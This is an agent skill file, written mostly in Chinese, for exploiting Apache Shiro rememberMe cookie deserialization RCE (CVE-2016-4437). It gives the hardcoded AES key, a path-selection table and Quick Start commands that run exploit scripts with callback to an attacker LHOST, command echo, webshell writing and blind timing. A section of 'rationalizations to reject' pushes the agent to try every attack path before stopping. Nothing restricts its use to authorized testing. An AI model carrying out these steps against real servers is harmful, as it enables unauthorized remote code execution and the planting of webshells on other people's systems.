---
name: shiro-deserialization
description: Exploits Apache Shiro rememberMe cookie deserialization RCE (CVE-2016-4437). Use when target runs Apache Shiro with exposed rememberMe endpoint and known/weak AES keys.
skill_type: exploit
severity: critical
tags: [java, deserialization, shiro, cve-2016-4437, cve-2020-1957]
cve: [CVE-2016-4437, CVE-2020-1957]
---

# Apache Shiro RememberMe 反序列化 RCE

## Essential Principles

1. **Shiro <= 1.2.4 使用硬编码 AES 密钥** `kPH+bIxk5D2deZiIxcaaaA==`，大量项目未修改
2. **rememberMe cookie = AES-CBC 加密的序列化对象**，目标反序列化时触发 gadget chain
3. **ysoserial 必须用 JDK 8 运行**，高版本 JDK 移除了关键 gadget 类
4. **检测方式分四种**：回调检测（首选）、回显检测（TomcatEcho）、写WebShell（有webroot）、时序盲检测（无回连无webroot）

## When to Use

- 扫描器/指纹报告 CVE-2016-4437 或 CVE-2020-1957
- HTTP 响应包含 `rememberMe=deleteMe` Set-Cookie 头
- 发送无效 rememberMe Cookie 后收到 `rememberMe=deleteMe`
- 目标已知或疑似运行 Apache Shiro

## When NOT to Use

- 目标 Shiro >= 1.6.0 且运维配置了强随机 AES 密钥（此时无法爆破密钥）
- 目标不运行 Java/Tomcat/Jetty 等 Servlet 容器
- 已通过其他漏洞获得 shell
- 探测确认目标无 rememberMe 端点

## Rationalizations to Reject

- "用 Metasploit 模块更简单" → MSF shiro 模块版本固定、密钥库有限，shiro_exploit.py 包含更多密钥变体和 gadget 组合
- "扫描器没报所以不存在" → 手动发送无效 Cookie 验证，扫描器可能漏报
- "先试其他漏洞" → Shiro RCE 如果存在通常一击必中，应优先尝试，不要浪费时间在低成功率漏洞上
- "回显路径失败了就放弃" → 还有三种备选路径，全部尝试完再放弃

## 路径选择

根据目标环境自动选择利用路径：

| 条件 | 路径 | 命令 | 成功率 |
|------|------|------|--------|
| LHOST 可达（公网/内网回连） | **A: 回调检测** | `python3 {skill_dir}/scripts/shiro_exploit.py {ENDPOINT} --lhost {LHOST} --port 39876` | 最高 |
| NAT + Tomcat 容器 | **B: 回显检测** | `python3 {skill_dir}/scripts/shiro_exploit.py {ENDPOINT} --echo` | 高 |
| NAT + 已知 webroot | **C: 写 WebShell** | `bash {skill_dir}/scripts/shiro_webshell_brute.sh {ENDPOINT} {TARGET_IP} {TARGET_PORT}` | 中 |
| NAT + 无 webroot | **D: 时序盲检测** | `python3 {skill_dir}/scripts/shiro_exploit.py {ENDPOINT} --blind` | 中低 |

## Quick Start

```bash
# 1. 确认 Shiro 存在（未认证即可检测）
curl -s -D - -o /dev/null {ENDPOINT} -H "Cookie: rememberMe=invalid_test" | grep "rememberMe=deleteMe"

# 2. 确认 JDK 8 可用
/usr/lib/jvm/java-8-openjdk-amd64/bin/java -version 2>&1 | head -1

# 3. 回调检测（推荐首选，最高成功率）
python3 {skill_dir}/scripts/shiro_exploit.py {ENDPOINT} --lhost {LHOST} --port 39876

# 4. 回显检测（NAT环境、Tomcat容器）
python3 {skill_dir}/scripts/shiro_exploit.py {ENDPOINT} --echo
```

## 详细流程

- 回调检测: [workflows/callback-exploit.md](workflows/callback-exploit.md)
- 回显检测: [workflows/echo-exploit.md](workflows/echo-exploit.md)
- 时序盲检测: [workflows/blind-exploit.md](workflows/blind-exploit.md)

## 参考资料

- Gadget 链选择: [references/gadget-chains.md](references/gadget-chains.md)
- 已知密钥库: [references/known-keys.md](references/known-keys.md)
